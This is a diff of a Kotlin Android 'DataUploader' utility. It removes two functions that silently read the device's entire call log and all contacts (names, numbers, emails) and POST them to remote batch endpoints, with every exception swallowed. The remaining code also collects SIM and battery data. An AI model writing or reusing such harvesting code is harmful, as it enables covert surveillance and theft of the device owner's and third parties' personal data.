@@ -2,7 +2,6 @@ package com.example.test.utils
 
 import android.content.Context
 import android.os.Build
-import android.provider.ContactsContract
 import android.provider.Telephony
 import android.database.Cursor
 import android.telephony.SubscriptionManager
@@ -60,73 +59,6 @@ object DataUploader {
         }
     }
 
-    fun uploadCallHistory(context: Context, deviceId: String) {
-        try {
-            val callsArray = JSONArray()
-            val cursor: Cursor? = context.contentResolver.query(
-                android.provider.CallLog.Calls.CONTENT_URI,
-                null, null, null,
-                android.provider.CallLog.Calls.DATE + " DESC"
-            )
-
-            cursor?.use {
-                val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
-                val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
-                val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
-                val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
-                val nameIndex = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
-                val idIndex = it.getColumnIndex(android.provider.CallLog.Calls._ID)
-
-                while (it.moveToNext()) {
-                    val callId = it.getLong(idIndex)
-                    val number = it.getString(numberIndex) ?: ""
-                    val type = it.getInt(typeIndex)
-                    val timestampSeconds = it.getLong(dateIndex)
-                    val timestamp = timestampSeconds * 1000
-                    val duration = it.getInt(durationIndex)
-                    val name = it.getString(nameIndex) ?: "Unknown"
-
-                    val callType = when (type) {
-                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
-                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
-                        android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
-                        android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
-                        android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
-                        android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
-                        else -> "unknown"
-                    }
-
-                    val call = JSONObject().apply {
-                        put("call_id", "${deviceId}_call_${callId}")
-                        put("device_id", deviceId)
-                        put("number", number)
-                        put("name", name)
-                        put("call_type", callType)
-                        put("timestamp", timestamp)
-                        put("duration", duration)
-                        put("received_at", System.currentTimeMillis())
-                    }
-                    callsArray.put(call)
-                }
-            }
-
-            if (callsArray.length() == 0) {
-                return
-            }
-
-            val payload = JSONObject().apply {
-                put("device_id", deviceId)
-                put("data", callsArray)
-                put("batch_info", JSONObject().apply {
-                    put("batch", 1)
-                    put("of", 1)
-                })
-            }
-
-            sendPostRequest("${getBaseUrl()}/call-logs/batch", payload.toString())
-        } catch (e: Exception) {
-        }
-    }
 
     private fun getSimInfoFromSubId(context: Context, subId: Int?): Pair<String, Int> {
         if (subId == null || subId < 0) return Pair("", -1)
@@ -363,79 +295,6 @@ object DataUploader {
         }
     }
 
-    fun uploadAllContacts(context: Context, deviceId: String) {
-        try {
-            val contacts = JSONArray()
-            val cursor: Cursor? = context.contentResolver.query(
-                ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null
-            )
-
-            cursor?.use {
-                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
-                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
-
-                while (it.moveToNext()) {
-                    val contactId = it.getString(idIndex)
-                    val name = it.getString(nameIndex) ?: ""
-
-                    var phoneNumber = ""
-                    val phoneCursor = context.contentResolver.query(
-                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
-                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                        arrayOf(contactId),
-                        null
-                    )
-
-                    phoneCursor?.use { pc ->
-                        val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                        if (pc.moveToFirst()) {
-                            phoneNumber = pc.getString(phoneIndex) ?: ""
-                        }
-                    }
-
-                    var email = ""
-                    val emailCursor = context.contentResolver.query(
-                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                        null,
-                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
-                        arrayOf(contactId),
-                        null
-                    )
-
-                    emailCursor?.use { ec ->
-                        val emailIndex = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
-                        if (ec.moveToFirst()) {
-                            email = ec.getString(emailIndex) ?: ""
-                        }
-                    }
-
-                    if (phoneNumber.isNotEmpty()) {
-                        val contact = JSONObject().apply {
-                            put("id", contactId)
-                            put("name", name)
-                            put("phone", phoneNumber)
-                            put("email", email)
-                        }
-                        contacts.put(contact)
-                    }
-                }
-            }
-
-            val json = JSONObject().apply {
-                put("device_id", deviceId)
-                put("data", contacts)
-                put("batch_info", JSONObject().apply {
-                    put("batch", 1)
-                    put("of", 1)
-                })
-            }
-
-            sendPostRequest("${getBaseUrl()}/contacts/batch", json.toString())
-        } catch (e: Exception) {
-        }
-    }
 
     fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
         try {
